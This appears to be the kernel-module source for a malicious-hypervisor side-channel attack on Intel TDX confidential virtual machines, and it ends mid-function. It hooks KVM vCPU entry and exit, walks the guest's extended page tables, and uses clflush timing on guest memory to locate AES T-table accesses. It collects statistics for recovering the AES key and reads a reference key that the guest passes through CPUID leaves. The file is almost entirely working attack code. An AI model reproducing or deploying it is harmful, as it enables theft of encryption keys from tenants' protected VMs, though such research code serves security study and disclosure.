#include <linux/init.h>
#include <linux/types.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <asm/io.h>
#include <asm/smp.h>
#include <asm/tlbflush.h>
#include <linux/slab.h>
#include <asm/desc.h>
#include <asm/current.h>
#include <linux/context_tracking.h>
#include <linux/cdev.h>
#include <asm/desc.h>
#include <asm/apic.h>
#include <asm/msr-index.h>
#include <linux/delay.h>
#include <linux/gfp.h>
#include <linux/module.h> /* Needed by all modules */ 
#include <asm/uaccess.h>
#include <linux/printk.h> /* Needed for pr_info() */ 
#include <linux/completion.h>
#include <linux/kthread.h>
#include <linux/threads.h>
#include <asm/unwind_hints.h>
#include <linux/objtool.h>
#include "int.h"

#define ATTACKER KERN_INFO "attacker: "
struct tdx_cpuid_value {
	u32 eax;
	u32 ebx;
	u32 ecx;
	u32 edx;
} __packed;
struct kvm_tdx_cpuid_config {
	u32 leaf;
	u32 sub_leaf;
	u32 eax;
	u32 ebx;
	u32 ecx;
	u32 edx;
};

struct tdx_info {
	u64 features0;
	u64 attributes_fixed0;
	u64 attributes_fixed1;
	u64 xfam_fixed0;
	u64 xfam_fixed1;

	u8 nr_tdcs_pages;
	u8 nr_tdvpx_pages;

	u16 num_cpuid_config;
	/* This must the last member. */
	DECLARE_FLEX_ARRAY(struct kvm_tdx_cpuid_config, cpuid_configs);
};

/* Info about the TDX module. */

//extern struct tdx_info *tdx_info;

struct td_params {
	u64 attributes;
	u64 xfam;
	u16 max_vcpus;
	u8 reserved0[6];

	u64 eptp_controls;
	u64 exec_controls;
	u16 tsc_frequency;
	u8  reserved1[38];

	u64 mrconfigid[6];
	u64 mrowner[6];
	u64 mrownerconfig[6];
	u64 reserved2[4];

	union {
		DECLARE_FLEX_ARRAY(struct tdx_cpuid_value, cpuid_values);
		u8 reserved3[768];
	};
} __packed __aligned(1024);


volatile uint64_t result = 0;
volatile uint64_t done = 0;
enum kvm_reg {
	VCPU_REGS_RAX, 
	VCPU_REGS_RCX, 
	VCPU_REGS_RDX, 
	VCPU_REGS_RBX, 
	VCPU_REGS_RSP, 
	VCPU_REGS_RBP, 
	VCPU_REGS_RSI, 
	VCPU_REGS_RDI, 
	VCPU_REGS_R8 , 
	VCPU_REGS_R9 , 
	VCPU_REGS_R10, 
	VCPU_REGS_R11, 
	VCPU_REGS_R12, 
	VCPU_REGS_R13, 
	VCPU_REGS_R14, 
	VCPU_REGS_R15, 
	VCPU_REGS_RIP,
	NR_VCPU_REGS,

	VCPU_EXREG_PDPTR = NR_VCPU_REGS,
	VCPU_EXREG_CR0,
	VCPU_EXREG_CR3,
	VCPU_EXREG_CR4,
	VCPU_EXREG_RFLAGS,
	VCPU_EXREG_SEGMENTS,
	VCPU_EXREG_EXIT_INFO_1,
	VCPU_EXREG_EXIT_INFO_2,
};


typedef struct
{
  uint64_t read                      :1;
  uint64_t write                     :1;
  uint64_t execute                   :1;
  uint64_t reserved_1                :5;
  uint64_t accessed                  :1;
  uint64_t ignored_1                 :1;
  uint64_t execute_user_mode         :1;
  uint64_t ignored_2                 :1;
  uint64_t page_ppn                  :36;
  uint64_t reserved_2                :4;
  uint64_t ignored_3                 :11;
  uint64_t suppress_ve               :1;
} __attribute__((__packed__)) EPTPageMapLevel5Entry;

typedef struct
{
  uint64_t read                      :1;
  uint64_t write                     :1;
  uint64_t execute                   :1;
  uint64_t reserved_1                :5;
  uint64_t accessed                  :1;
  uint64_t ignored_1                 :1;
  uint64_t execute_user_mode         :1;
  uint64_t ignored_2                 :1;
  uint64_t page_ppn                  :36;
  uint64_t reserved_2                :4;
  uint64_t ignored_3                 :11;
  uint64_t suppress_ve               :1;
} __attribute__((__packed__)) EPTPageMapLevel4Entry;

typedef struct
{
  uint64_t read                      :1;
  uint64_t write                     :1;
  uint64_t execute                   :1;
  uint64_t reserved_1                :4;
  uint64_t huge                      :1;
  uint64_t accessed                  :1;
  uint64_t ignored_1                 :1;
  uint64_t execute_user_mode         :1;
  uint64_t ignored_2                 :1;
  uint64_t page_ppn                  :36;
  uint64_t reserved_2                :4;
  uint64_t ignored_3                 :11;
  uint64_t suppress_ve               :1;
} __attribute__((__packed__)) EPTPageDirectoryPointerTableEntry;

typedef struct
{
  uint64_t read                      :1;
  uint64_t write                     :1;
  uint64_t execute                   :1;
  uint64_t reserved_1                :4;
  uint64_t huge                      :1;
  uint64_t accessed                  :1;
  uint64_t ignored_1                 :1;
  uint64_t execute_user_mode         :1;
  uint64_t ignored_2                 :1;
  uint64_t page_ppn                  :36;
  uint64_t reserved_2                :4;
  uint64_t ignored_3                 :11;
  uint64_t suppress_ve               :1;
} __attribute__((__packed__)) EPTPageDirectoryEntry;

typedef struct
{
  uint64_t read                      :1;
  uint64_t write                     :1;
  uint64_t execute                   :1;
  uint64_t ept_memory_type           :3;
  uint64_t ignore_pat                :1;
  uint64_t ignored_1                 :1;
  uint64_t accessed                  :1;
  uint64_t dirty                     :1;
  uint64_t execute_user_mode         :1;
  uint64_t ignored_2                 :1;
  uint64_t page_ppn                  :36;
  uint64_t reserved                  :4;
  uint64_t ignored_3                 :11;
  uint64_t suppress_ve               :1;
} __attribute__((__packed__)) EPTPageTableEntry;

struct OutData {
  void *vcpu;
  void *shared_ept_page;
  int vcpu_id;
  u64 exit_reason;
  uint64_t tdvmcall;
  uint64_t *kvm_vcpu_arch;
  uint64_t tdr_pa;
  uint64_t tdcs_pa;
  struct list_head *mmu;
  struct list_head *mmu_root;
  uint64_t tdvpr_pa;
};
typedef unsigned long  gva_t;
typedef u64            gpa_t;
typedef u64            gfn_t;

#define INVALID_GPA	(~(gpa_t)0)

typedef unsigned long  hva_t;
typedef u64            hpa_t;
typedef u64            hfn_t;
typedef u64 __rcu *tdp_ptep_t;
struct kvm_rmap_head {
	unsigned long val;
};
union kvm_mmu_page_role {
	u32 word;
	struct {
		unsigned level:4;
		unsigned has_4_byte_gpte:1;
		unsigned quadrant:2;
		unsigned direct:1;
		unsigned access:3;
		unsigned invalid:1;
		unsigned efer_nx:1;
		unsigned cr0_wp:1;
		unsigned smep_andnot_wp:1;
		unsigned smap_andnot_wp:1;
		unsigned ad_disabled:1;
		unsigned guest_mode:1;
		unsigned passthrough:1;
		unsigned :5;

		/*
		 * This is left at the top of the word so that
		 * kvm_memslots_for_spte_role can extract it with a
		 * simple shift.  While there is room, give it a whole
		 * byte so it is also faster to load it from memory.
		 */
		unsigned smm:8;
	};
};

struct kvm_mmu_page {
	/*
	 * Note, "link" through "spt" fit in a single 64 byte cache line on
	 * 64-bit kernels, keep it that way unless there's a reason not to.
	 */
	struct list_head link;
	struct hlist_node hash_link;

	bool tdp_mmu_page;
	bool unsync;
	u8 mmu_valid_gen;

	 /*
	  * The shadow page can't be replaced by an equivalent huge page
	  * because it is being used to map an executable page in the guest
	  * and the NX huge page mitigation is enabled.
	  */
	bool nx_huge_page_disallowed;

	/*
	 * The following two entries are used to key the shadow page in the
	 * hash table.
	 */
	union kvm_mmu_page_role role;
	gfn_t gfn;

	u64 *spt;

	/*
	 * Stores the result of the guest translation being shadowed by each
	 * SPTE.  KVM shadows two types of guest translations: nGPA -> GPA
	 * (shadow EPT/NPT) and GVA -> GPA (traditional shadow paging). In both
	 * cases the result of the translation is a GPA and a set of access
	 * constraints.
	 *
	 * The GFN is stored in the upper bits (PAGE_SHIFT) and the shadowed
	 * access permissions are stored in the lower bits. Note, for
	 * convenience and uniformity across guests, the access permissions are
	 * stored in KVM format (e.g.  ACC_EXEC_MASK) not the raw guest format.
	 */
	u64 *shadowed_translation;

	/* Currently serving as active root */
	union {
		int root_count;
		refcount_t tdp_mmu_root_count;
	};
	unsigned int unsync_children;
	union {
		struct kvm_rmap_head parent_ptes; /* rmap pointers to parent sptes */
		tdp_ptep_t ptep;
	};
	union {
		DECLARE_BITMAP(unsync_child_bitmap, 512);
		struct {
			struct work_struct tdp_mmu_async_work;
			void *tdp_mmu_async_data;
		};
	};

	/*
	 * Tracks shadow pages that, if zapped, would allow KVM to create an NX
	 * huge page.  A shadow page will have nx_huge_page_disallowed set but
	 * not be on the list if a huge page is disallowed for other reasons,
	 * e.g. because KVM is shadowing a PTE at the same gfn, the memslot
	 * isn't properly aligned, etc...
	 */
	struct list_head possible_nx_huge_page_link;


	/* Number of writes since the last time traversal visited this page.  */
	atomic_t write_flooding_count;

	/* Used for freeing the page asynchronously if it is a TDP MMU page. */
	struct rcu_head rcu_head;

};
struct kvm_vcpu_arch {
	/*
	 * rip and regs accesses must go through
	 * kvm_{register,rip}_{read,write} functions.
	 */
	unsigned long regs[NR_VCPU_REGS];
	u32 regs_avail;
	u32 regs_dirty;

	unsigned long cr0;
	unsigned long cr0_guest_owned_bits;
	unsigned long cr2;
	unsigned long cr3;
	unsigned long cr4;
	unsigned long cr4_guest_owned_bits;
	unsigned long cr4_guest_rsvd_bits;
	unsigned long cr8;
	u32 host_pkru;
	u32 pkru;
	u32 hflags;
	u64 efer;
	u64 apic_base;
	void *apic;
};
#define PT64_ROOT_MAX_LEVEL 5
struct tdp_iter {
	/*
	 * 	 * The iterator will traverse the paging structure towards the mapping
	 * 	 	 * for this GFN.
	 * 	 	 	 */
	gfn_t next_last_level_gfn;
	/*
	 * 	 * The next_last_level_gfn at the time when the thread last
	 * 	 	 * yielded. Only yielding when the next_last_level_gfn !=
	 * 	 	 	 * yielded_gfn helps ensure forward progress.
	 * 	 	 	 	 */
	gfn_t yielded_gfn;
	/* Pointers to the page tables traversed to reach the current SPTE */
	tdp_ptep_t pt_path[PT64_ROOT_MAX_LEVEL];
	/* A pointer to the current SPTE */
	tdp_ptep_t sptep;
	/* The lowest GFN (shared bits included) mapped by the current SPTE */
	gfn_t gfn;
	/* The level of the root page given to the iterator */
	int root_level;
	/* The lowest level the iterator should traverse to */
	int min_level;
	/* The iterator's current level within the paging structure */
	int level;
	/* The address space ID, i.e. SMM vs. regular. */
	int as_id;
	/* A snapshot of the value at sptep */
	u64 old_spte;
	/*
	 * 	 * Whether the iterator has a valid state. This will be false if the
	 * 	 	 * iterator walks off the end of the paging structure.
	 * 	 	 	 */
	bool valid;
	/*
	 * 	 * True if KVM dropped mmu_lock and yielded in the middle of a walk, in
	 * 	 	 * which case tdp_iter_next() needs to restart the walk at the root
	 * 	 	 	 * level instead of advancing to the next entry.
	 * 	 	 	 	 */
	bool yielded;
};
#define SPTE_LEVEL_BITS			9
#define __PT_LEVEL_SHIFT(level, bits_per_level)	\
		(PAGE_SHIFT + ((level) - 1) * (bits_per_level))
#define __PT_INDEX(address, level, bits_per_level) \
		(((address) >> __PT_LEVEL_SHIFT(level, bits_per_level)) & ((1 << (bits_per_level)) - 1))
#define SPTE_INDEX(address, level)	__PT_INDEX(address, level, SPTE_LEVEL_BITS)
#define KVM_MAX_HUGEPAGE_LEVEL	PG_LEVEL_1G
#define KVM_NR_PAGE_SIZES	(KVM_MAX_HUGEPAGE_LEVEL - PG_LEVEL_4K + 1)
#define KVM_HPAGE_GFN_SHIFT(x)	(((x) - 1) * 9)
#define KVM_HPAGE_GFN_MASK(x)	(~((1UL << KVM_HPAGE_GFN_SHIFT(x)) - 1))
#define KVM_HPAGE_SHIFT(x)	(PAGE_SHIFT + KVM_HPAGE_GFN_SHIFT(x))
#define KVM_HPAGE_SIZE(x)	(1UL << KVM_HPAGE_SHIFT(x))
#define KVM_HPAGE_MASK(x)	(~(KVM_HPAGE_SIZE(x) - 1))
#define KVM_PAGES_PER_HPAGE(x)	(KVM_HPAGE_SIZE(x) / PAGE_SIZE)
#define SPTE_MMU_PRESENT_MASK		BIT_ULL(11)
#define PT_PAGE_SIZE_SHIFT 7
#define PT_PAGE_SIZE_MASK (1ULL << PT_PAGE_SIZE_SHIFT)

#define SPTE_LEVEL_BITS			9
#define __PT_ENT_PER_PAGE(bits_per_level)  (1 << (bits_per_level))
#define SPTE_ENT_PER_PAGE		__PT_ENT_PER_PAGE(SPTE_LEVEL_BITS)
typedef u64 hfn_t;

typedef hfn_t kvm_pfn_t;

#define SPTE_BASE_ADDR_MASK (physical_mask & ~(u64)(PAGE_SIZE-1))

static inline int kvm_mmu_role_as_id(union kvm_mmu_page_role role)
{
	return role.smm ? 1 : 0;
}

static inline int kvm_mmu_page_as_id(struct kvm_mmu_page *sp)
{
	return kvm_mmu_role_as_id(sp->role);
}
static inline kvm_pfn_t spte_to_pfn(u64 pte)
{
	return (pte & SPTE_BASE_ADDR_MASK) >> PAGE_SHIFT;
}
static inline bool is_large_pte(u64 pte)
{
	return pte & PT_PAGE_SIZE_MASK;
}
static inline bool is_last_spte(u64 pte, int level)
{
	return (level == PG_LEVEL_4K) || is_large_pte(pte);
}
static inline bool is_shadow_present_pte(u64 pte)
{
	return !!(pte & SPTE_MMU_PRESENT_MASK);
}

static inline gfn_t gfn_round_for_level(gfn_t gfn, int level)
{
	return gfn & -KVM_PAGES_PER_HPAGE(level);
}
static inline u64 kvm_tdp_mmu_read_spte(tdp_ptep_t sptep)
{
	return READ_ONCE(*rcu_dereference(sptep));
}
tdp_ptep_t spte_to_child_pt(u64 pte, int level);

void tdp_iter_start(struct tdp_iter *iter, struct kvm_mmu_page *root,
				    int min_level, gfn_t next_last_level_gfn);
void tdp_iter_next(struct tdp_iter *iter);
void tdp_iter_restart(struct tdp_iter *iter);
void tdp_iter_step_side(struct tdp_iter *iter);
void tdp_iter_step_down(struct tdp_iter *iter, tdp_ptep_t child_pt);
static void tdp_iter_refresh_sptep(struct tdp_iter *iter)
{
	iter->sptep = iter->pt_path[iter->level - 1] +
		SPTE_INDEX(iter->gfn << PAGE_SHIFT, iter->level);
	iter->old_spte = kvm_tdp_mmu_read_spte(iter->sptep);
}
void tdp_iter_restart(struct tdp_iter *iter)
{
	iter->yielded = false;
	iter->yielded_gfn = iter->next_last_level_gfn;
	iter->level = iter->root_level;

	iter->gfn = gfn_round_for_level(iter->next_last_level_gfn, iter->level);
	tdp_iter_refresh_sptep(iter);

	iter->valid = true;
}
tdp_ptep_t spte_to_child_pt(u64 spte, int level)
{
		/*
		 * 	 * There's no child entry if this entry isn't present or is a
		 * 	 	 * last-level entry.
		 * 	 	 	 */
		if (!is_shadow_present_pte(spte) || is_last_spte(spte, level))
					return NULL;

			return (tdp_ptep_t)__va(spte_to_pfn(spte) << PAGE_SHIFT);
}

static void step_down(struct tdp_iter *iter, tdp_ptep_t child_pt)
{
		iter->level--;
			iter->pt_path[iter->level - 1] = child_pt;
				iter->gfn = gfn_round_for_level(iter->next_last_level_gfn, iter->level);
					tdp_iter_refresh_sptep(iter);
}

/*
 *  * Steps down one level in the paging structure towards the goal GFN. Returns
 *   * true if the iterator was able to step down a level, false otherwise.
 *    */
static bool try_step_down(struct tdp_iter *iter)
{
	tdp_ptep_t child_pt;

	if (iter->level == iter->min_level)
		return false;

	/*
	 * 	 * Reread the SPTE before stepping down to avoid traversing into page
	 * 	 	 * tables that are no longer linked from this entry.
	 * 	 	 	 */
	iter->old_spte = kvm_tdp_mmu_read_spte(iter->sptep);

	child_pt = spte_to_child_pt(iter->old_spte, iter->level);
	if (!child_pt)
		return false;

	step_down(iter, child_pt);
	return true;
}

/* Steps down for frozen spte.  Don't re-read sptep because it was frozen. */
void tdp_iter_step_down(struct tdp_iter *iter, tdp_ptep_t child_pt)
{
	WARN_ON_ONCE(!child_pt);
	WARN_ON_ONCE(iter->yielded);
	WARN_ON_ONCE(iter->level == iter->min_level);

	step_down(iter, child_pt);
}

void tdp_iter_step_side(struct tdp_iter *iter)
{
	iter->gfn += KVM_PAGES_PER_HPAGE(iter->level);
	iter->next_last_level_gfn = iter->gfn;
	iter->sptep++;
	iter->old_spte = kvm_tdp_mmu_read_spte(iter->sptep);
}
static bool try_step_side(struct tdp_iter *iter)
{
	/*
	 * 	 * Check if the iterator is already at the end of the current page
	 * 	 	 * table.
	 * 	 	 	 */
	if (SPTE_INDEX(iter->gfn << PAGE_SHIFT, iter->level) ==
			(SPTE_ENT_PER_PAGE - 1))
		return false;

	tdp_iter_step_side(iter);

	return true;
}

/*
 *  * Tries to traverse back up a level in the paging structure so that the walk
 *   * can continue from the next entry in the parent page table. Returns true on a
 *    * successful step up, false if already in the root page.
 *     */
static bool try_step_up(struct tdp_iter *iter)
{
	if (iter->level == iter->root_level)
		return false;

	iter->level++;
	iter->gfn = gfn_round_for_level(iter->gfn, iter->level);
	tdp_iter_refresh_sptep(iter);

	return true;
}
void tdp_iter_start(struct tdp_iter *iter, struct kvm_mmu_page *root,
		int min_level, gfn_t next_last_level_gfn)
{
	if (WARN_ON_ONCE(!root || (root->role.level < 1) ||
				(root->role.level > PT64_ROOT_MAX_LEVEL))) {
		iter->valid = false;
		return;
	}

	iter->next_last_level_gfn = next_last_level_gfn;
	iter->root_level = root->role.level;
	iter->min_level = min_level;
	iter->pt_path[iter->root_level - 1] = (tdp_ptep_t)root->spt;
	iter->as_id = kvm_mmu_page_as_id(root);

	tdp_iter_restart(iter);
}
void tdp_iter_next(struct tdp_iter *iter)
{
	if (iter->yielded) {
		tdp_iter_restart(iter);
		return;
	}

	if (try_step_down(iter))
		return;

	do {
		if (try_step_side(iter))
			return;
	} while (try_step_up(iter));
	iter->valid = false;
}
#define for_each_tdp_pte_min_level(iter, root, min_level, start, end) \
		for (tdp_iter_start(&iter, root, min_level, start); \
					     iter.valid && iter.gfn < end;		     \
					     	     tdp_iter_next(&iter))

#define for_each_tdp_pte(iter, root, start, end) \
		for_each_tdp_pte_min_level(iter, root, PG_LEVEL_4K, start, end)
enum VMCALL {
  CPUID = 10,
  HLT = 12,
  IO = 30,
  RDMSR = 31,
  WRMSR = 32,
  MMIO = 48,
  WBINVD = 54,
  PCONFIG = 65
};
char const *translateVMCALL(int reason) {
  switch (reason) {
    case CPUID:
      return "CPUID";
    case HLT:
      return "HLT";
    case RDMSR:
      return "RDMSR";
    case WRMSR:
      return "WRMSR";
    case MMIO:
      return "MMIO";
    case WBINVD:
      return "WBINVD";
    case PCONFIG:
      return "PCONFIG";
    case IO:
      return "IO";
    default:
      return "UNKWN";
  }
}

void serialize_(void) {
  asm volatile("serialize":::"memory");
}
uint64_t rdtsc_nofences_(void) {
  uint64_t a, d;
  asm volatile("rdtsc" : "=a"(a), "=d"(d) ::"memory");
  return (d << 32) | a;
}

int ioctl_major = 0;
int ioctl_minor = 0;
struct class *chardev_class = NULL;

static long ioctl(struct file *filp, unsigned int cmd, unsigned long arg);
struct file_operations ioctl_interface_fops = {
	.owner = THIS_MODULE,
	.read = NULL,
	.write = NULL,
	.open = NULL,
	.unlocked_ioctl = ioctl,
	.release = NULL,
  .mmap = NULL
};
struct cdev cdev = {
  .owner = THIS_MODULE,
  .ops = &ioctl_interface_fops
};




extern void (* volatile vcpu_run_beg_hook)(struct OutData *);
extern void (* volatile vcpu_run_end_hook)(struct OutData *);
extern void (* volatile td_init_hook)(struct td_params *, void *);
























static DECLARE_COMPLETION( on_exit );


volatile int unloading = 0;
uint64_t rdtsc_nofences(void) {
  uint64_t a, d;
  asm volatile("rdtsc" : "=a"(a), "=d"(d) ::"memory");
  return (d << 32) | a;
}
void clflush_(void *mem) {
  asm volatile("clflush (%0)"::"r"(mem):"memory");
}
void mfence(void) {
  asm volatile("mfence":::"memory");
}
void lfence(void) {
  asm volatile("lfence":::"memory");
}
void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }


int accessed(void *addr) {
  size_t sum = 0;
  size_t i = 0;
  mfence();
  size_t b = rdtsc_nofences();
  //maccess(addrr);
  clflush_(addr);
  mfence();
  size_t e = rdtsc_nofences();
  printk("TDX2: %lld\n", e-b);
  mfence();
  return e-b > 200;
}

atomic_t t_command;
atomic_t t_result;
atomic_t t_mode;

#define OFFSET (4096)
char acc[4096*1024] __attribute__((aligned(4096)));
size_t res[256] __attribute__((aligned(4096)));
size_t *dd;
size_t *dd2;

void * volatile dat;
size_t arrr[1024];
size_t arrr2[1024];

struct list_head *mmu_root;

volatile uint64_t ccnt;

int tdxaes(void *) {
  memset(arrr, sizeof(arrr), 0xff);
  memset(arrr2, sizeof(arrr2), 0xff);

  const uint64_t pgoff = 0xbc0;
  


  while (!unloading) {

    if (!atomic_read(&t_command)) continue;

    {
      
      int mode = atomic_read(&t_mode) == 1;
      struct list_head *r = mmu_root;
      struct kvm_mmu_page *node;
      struct tdp_iter iter;

      list_for_each_entry(node, r, link) {
        for_each_tdp_pte_min_level(iter, node, PG_LEVEL_2M, 1,1ULL<<34) {
          if (!(iter.old_spte&0b111) || !(iter.old_spte&0x80)) {
	  continue;
	  }
      	  if (iter.gfn >0 && iter.gfn < 1024ULL*1024ULL*1024ULL) {
	    for (size_t j = 0; j < 512; ++j) {
	    uint64_t pa = ((iter.old_spte&(~0x1fffffULL))&((1ULL<<51)-1))+(0x1000*j);
      	    uint8_t *datt = (uint8_t*)__va(pa);
	    uint64_t cnt = 0;
	    for (size_t i = 0xbc0; i < 0x1000; i+=64) {
	      mfence();
    	      size_t beg = rdtsc_nofences();
	      clflush(datt+i);
	      mfence();
    	      size_t end = rdtsc_nofences();
	      mfence();
	      if ((end-beg < 120 && mode) || (end-beg > 120 && !mode)) ++cnt;
            }
	    dd[iter.gfn+j] += cnt;
	    if (unloading) goto out;

	    }
	  }
        }
      }
      ccnt += 1;
      if (ccnt >= 10) atomic_set(&t_command, 0);


    }
  }
  out:
  return 0;

}


#define MAX 1

size_t buf_cnt = 0;
size_t buffer[1024*10];
size_t buffer2[1024*10];
size_t last_time = 0;
size_t llast_time = 0;
size_t lllast_time = 0;


char *monitor;





uint64_t cpuid_ret = -1ULL;

uint8_t *ttables;

void hook1(struct OutData *vcpu) {
  //printk("TDX hook entry: %x %x %x %x %x %x %x %x\n", vcpu->desc->pir[0], vcpu->desc->pir[1], vcpu->desc->pir[2], vcpu->desc->pir[3], vcpu->desc->pir[4], vcpu->desc->pir[5], vcpu->desc->pir[6], vcpu->desc->pir[7]);
  //return; 
  mmu_root = vcpu->mmu_root;
  //atomic_set(&t_command, 1);
  if (cpuid_ret != -1ULL) {
    vcpu->kvm_vcpu_arch[VCPU_REGS_R12] = cpuid_ret;
    vcpu->kvm_vcpu_arch[VCPU_REGS_R10] = 0;
    cpuid_ret = -1ULL;
  }
}
struct tdx_module_args {
  /* callee-clobbered */
  u64 rcx;
  u64 rdx;
  u64 r8;
  u64 r9;
  /* extra callee-clobbered */
  u64 r10;
  u64 r11;
  /* callee-saved + rdi/rsi */
  u64 r12;
  u64 r13;
  u64 r14;
  u64 r15;
  u64 rbx;
  u64 rdi;
  u64 rsi;
};
u64 __seamcall_saved_ret(u64 fn, struct tdx_module_args *args);


uint64_t *adddr = 0;

uint64_t mm = 0;
uint64_t p1,p2;
uint64_t results[16][16];
uint64_t print_cnt = 0;
size_t ct_byte_freq[16][256];
size_t hit_rate[16][256];
int last_round_key_guess[16];
size_t cache_hits[16][256];
size_t key_candidates[16][256];
int top_elems(size_t *arr, int N, size_t *top, int n) { 
  int top_count = 0; 
  int i; 
  for (i=0;i<N;++i) { 
    int k; 
    for (k=top_count;k>0 && arr[i]>arr[top[k-1]];k--); 
    if (k>=n) continue; 
    int j=top_count; 
    if (j>n-1) { 
      j=n-1; 
    } else { 
      top_count++; 
    } 
    for (;j>k;j--) { 
      top[j]=top[j-1]; 
    } 
    top[k] = i; 
  } 
  return top_count; 
}
static const uint8_t Te4[256] = {
    0x63U, 0x7cU, 0x77U, 0x7bU, 0xf2U, 0x6bU, 0x6fU, 0xc5U,
    0x30U, 0x01U, 0x67U, 0x2bU, 0xfeU, 0xd7U, 0xabU, 0x76U,
    0xcaU, 0x82U, 0xc9U, 0x7dU, 0xfaU, 0x59U, 0x47U, 0xf0U,
    0xadU, 0xd4U, 0xa2U, 0xafU, 0x9cU, 0xa4U, 0x72U, 0xc0U,
    0xb7U, 0xfdU, 0x93U, 0x26U, 0x36U, 0x3fU, 0xf7U, 0xccU,
    0x34U, 0xa5U, 0xe5U, 0xf1U, 0x71U, 0xd8U, 0x31U, 0x15U,
    0x04U, 0xc7U, 0x23U, 0xc3U, 0x18U, 0x96U, 0x05U, 0x9aU,
    0x07U, 0x12U, 0x80U, 0xe2U, 0xebU, 0x27U, 0xb2U, 0x75U,
    0x09U, 0x83U, 0x2cU, 0x1aU, 0x1bU, 0x6eU, 0x5aU, 0xa0U,
    0x52U, 0x3bU, 0xd6U, 0xb3U, 0x29U, 0xe3U, 0x2fU, 0x84U,
    0x53U, 0xd1U, 0x00U, 0xedU, 0x20U, 0xfcU, 0xb1U, 0x5bU,
    0x6aU, 0xcbU, 0xbeU, 0x39U, 0x4aU, 0x4cU, 0x58U, 0xcfU,
    0xd0U, 0xefU, 0xaaU, 0xfbU, 0x43U, 0x4dU, 0x33U, 0x85U,
    0x45U, 0xf9U, 0x02U, 0x7fU, 0x50U, 0x3cU, 0x9fU, 0xa8U,
    0x51U, 0xa3U, 0x40U, 0x8fU, 0x92U, 0x9dU, 0x38U, 0xf5U,
    0xbcU, 0xb6U, 0xdaU, 0x21U, 0x10U, 0xffU, 0xf3U, 0xd2U,
    0xcdU, 0x0cU, 0x13U, 0xecU, 0x5fU, 0x97U, 0x44U, 0x17U,
    0xc4U, 0xa7U, 0x7eU, 0x3dU, 0x64U, 0x5dU, 0x19U, 0x73U,
    0x60U, 0x81U, 0x4fU, 0xdcU, 0x22U, 0x2aU, 0x90U, 0x88U,
    0x46U, 0xeeU, 0xb8U, 0x14U, 0xdeU, 0x5eU, 0x0bU, 0xdbU,
    0xe0U, 0x32U, 0x3aU, 0x0aU, 0x49U, 0x06U, 0x24U, 0x5cU,
    0xc2U, 0xd3U, 0xacU, 0x62U, 0x91U, 0x95U, 0xe4U, 0x79U,
    0xe7U, 0xc8U, 0x37U, 0x6dU, 0x8dU, 0xd5U, 0x4eU, 0xa9U,
    0x6cU, 0x56U, 0xf4U, 0xeaU, 0x65U, 0x7aU, 0xaeU, 0x08U,
    0xbaU, 0x78U, 0x25U, 0x2eU, 0x1cU, 0xa6U, 0xb4U, 0xc6U,
    0xe8U, 0xddU, 0x74U, 0x1fU, 0x4bU, 0xbdU, 0x8bU, 0x8aU,
    0x70U, 0x3eU, 0xb5U, 0x66U, 0x48U, 0x03U, 0xf6U, 0x0eU,
    0x61U, 0x35U, 0x57U, 0xb9U, 0x86U, 0xc1U, 0x1dU, 0x9eU,
    0xe1U, 0xf8U, 0x98U, 0x11U, 0x69U, 0xd9U, 0x8eU, 0x94U,
    0x9bU, 0x1eU, 0x87U, 0xe9U, 0xceU, 0x55U, 0x28U, 0xdfU,
    0x8cU, 0xa1U, 0x89U, 0x0dU, 0xbfU, 0xe6U, 0x42U, 0x68U,
    0x41U, 0x99U, 0x2dU, 0x0fU, 0xb0U, 0x54U, 0xbbU, 0x16U
};

uint32_t subWord(uint32_t word) {
  uint32_t retval = 0;

  uint8_t t1 = Te4[(word >> 24) & 0x000000ff];
  uint8_t t2 = Te4[(word >> 16) & 0x000000ff];
  uint8_t t3 = Te4[(word >> 8 ) & 0x000000ff];
  uint8_t t4 = Te4[(word      ) & 0x000000ff];

  retval = (t1 << 24) ^ (t2 << 16) ^ (t3 << 8) ^ t4;

  return retval;
}

uint8_t *ttables2;


char current_key[16];



void hook2(struct OutData *vcpu) {

  get_cpu();
  uint64_t i = 0;

  uint64_t reason = vcpu->exit_reason;
  uint64_t reg_bitmap = vcpu->kvm_vcpu_arch[VCPU_REGS_RCX];
  uint64_t vspec_vmcall = vcpu->kvm_vcpu_arch[VCPU_REGS_R10];
  uint64_t vmcall_leaf = vcpu->kvm_vcpu_arch[VCPU_REGS_R11];

  int is_vmcall = vcpu->exit_reason == 0x4d;
  if (is_vmcall && vmcall_leaf == CPUID && vcpu->kvm_vcpu_arch[VCPU_REGS_R12] == 0x40000040ULL) {
	  memcpy(current_key, &vcpu->kvm_vcpu_arch[VCPU_REGS_R13], 8);

  }
  if (is_vmcall && vmcall_leaf == CPUID && vcpu->kvm_vcpu_arch[VCPU_REGS_R12] == 0x40000041ULL) {
	  memcpy(current_key+8, &vcpu->kvm_vcpu_arch[VCPU_REGS_R13], 8);
  }
  if (is_vmcall && vmcall_leaf == CPUID && vcpu->kvm_vcpu_arch[VCPU_REGS_R12] == 0x40000069ULL) {
    size_t mode = (vcpu->kvm_vcpu_arch[VCPU_REGS_R13]&~0xffULL) == 0 ? vcpu->kvm_vcpu_arch[VCPU_REGS_R13] : 2;
    if (mode == 1) {
      mm = 0;
      if (atomic_read(&t_mode) == 0) {
      printk("gooobba\n");
        ccnt = 0;
        atomic_set(&t_mode, 1);
        atomic_set(&t_command, 1);
        cpuid_ret = 1;
      }
      else if (atomic_read(&t_mode) == 1) {
      printk("gooobbc\n");
        ccnt = 0;
        atomic_set(&t_mode, 2);
        atomic_set(&t_command, 1);
        cpuid_ret = 2;
      }
      else if (atomic_read(&t_mode) == 2) {
      printk("gooobbd\n");
        atomic_set(&t_mode, 3);
        atomic_set(&t_command, 0);
        cpuid_ret = 3;
	size_t max = 0;
	size_t max_val = 0;
	for (size_t i = 0; i < 1024ULL*1024ULL*1024ULL; ++i) {
	  if (dd[i] > max_val) {
	    max_val = dd[i];
	    max = i;
	  }
	}
	size_t max2 = 0;
	size_t max_val2 = 0;
	for (size_t i = 0; i < 1024ULL*1024ULL*1024ULL; ++i) {
	  if (dd2[i] > max_val2) {
	    max_val2 = dd2[i];
	    max2 = i;
	  }
	}
	printk("TDX max: %lx: %ld\n", max, max_val);
	printk("TDX max: %lx: %ld\n", max2, max_val2);

        struct list_head *r = mmu_root;
        struct kvm_mmu_page *node;
        struct tdp_iter iter;

	uint64_t gfn = max&(~0x1ffULL);

        list_for_each_entry(node, r, link) {
